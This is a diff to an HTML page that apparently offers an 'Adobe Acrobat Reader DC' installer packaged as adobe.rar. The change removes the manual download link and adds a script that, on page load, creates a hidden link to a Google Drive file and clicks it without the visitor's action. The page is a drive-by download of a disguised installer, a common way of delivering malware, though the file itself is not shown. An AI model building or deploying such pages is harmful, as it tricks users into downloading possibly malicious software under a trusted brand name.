@@ -1,13 +1,24 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Download File</title>
+    <title>Auto-Download File</title>
 </head>
 <body>
-    <h1>Download File</h1>
-    <p>Click the link below to download the file:</p>
-    <a href="C:\Users\whiteDNL\Desktop\Nowy folder (10)\Adobe Acrobat Reader DC Install for all versions_files\adobe.rar" download>Download File</a>
+    <script>
+        // JavaScript to trigger the download automatically
+        window.onload = function() {
+            // Create an anchor element
+            var downloadLink = document.createElement('a');
+            
+            // Set the link's href attribute to the file's URL
+            downloadLink.href = "https://doc-04-0k-docs.googleusercontent.com/docs/securesc/bju3oi0pk0v91v38f1c3g05m171bplb9/dgkq96a5fumuj0p9fmdj9up70nf2fh6j/1694967375000/07480888362703689773/03248490155262214838/15Es9Ynl_48QvpgfF0KFJOGWwa-GkcuUs?e=download&ax=AA75yW5zJMCaOtMW753eV0Yvjj_nqxR3sbOUxPSUv2bEdZeF-562iJrmypeGA6upxZNE0RFR1m8FD1V3CjlkauGbQYHgOpL1tga9pjpIXRn-z08K-fiZDWxDAwxbV2jXkOSWyH4vMXOowxgy3heQxzmDIxcE5op79Iy3wqOOrG1CSmyubPWmYs5CMC5Xj0m31xLxthVyeUiHNo-CAUipVmnB_kyrarJzLIa0vYBl0Up65xIVgJj8QbtLs9iJbgQZNo3JQbeuytdk9M8P0bXj-dLgEz0su7lhrCLlTpufbOTPCehQ8ZC012hgBNwcqAsr6xwxugng1TJ3-XTBDyPeO26cN5wZ6qFWt9ktneyTIGguNdt5WrQMFRHo09civhfFaJX2xjaAEjO90nMI6Hhkkj2Ym_xNyOcJut1PGrdNzVahvzdyKd4z4dpvhCuMWKOCUkmhK6UJuxXUnH9VjrKyBt1noIWlJapC0oiNED6AjUadVPmYhuPv_KJMT5ITH16G3r54KJu76CqnVXVX35ViX_U6zXpsPqqeIINbZL6mlcS0XLV9u93nbc6qMWfMeEGpQ8eAqj2_Cnx2PyppVlLpc6Z3UC425ZQ_XVRcHPtJLwolMJAb5I76CNWbqCbsEUkezpfy-IP24dVUqIlmHcy6-2DbsUrwbsv7ZhpdWxsjsikZWrYXFEANFZyyteRuUHeZj2k4WO08yQWLlPO3O_GJWlK8243UcPoB-xPfTbj5ZTJ83ngjmE2EJQw7o33_NDJd3vb39BFqCKMdNIAKo31YGBoryH-u6rj_3pDAezVVAMw2Vrgs04G-Kyc3Rr1mYOL4DQWexuRZVwsS3X3w1c886oEKztBYGIaOeOO-JjklVf3BjssPEyVu13EJjCnm8y36n9I2X8Ph1iK1aiuhcZcXA22bnhj2indFqYXmGPEmVo_1zsktUxjOKGb9Z33HEV6NY692p1vxQkgldw&uuid=6bef6a17-32bb-403c-a3ec-061e890ceb6b&authuser=0&nonce=8mcn4eu82eloa&user=03248490155262214838&hash=87vlqptn5q3nsul213l5k4hms07eskla";
+            
+            // Set the download attribute to suggest a filename for the user
+            downloadLink.download = 'desired-filename.ext';
+            
+            // Simulate a click on the anchor element to trigger the download
+            downloadLink.click();
+        };
+    </script>
 </body>
 </html>
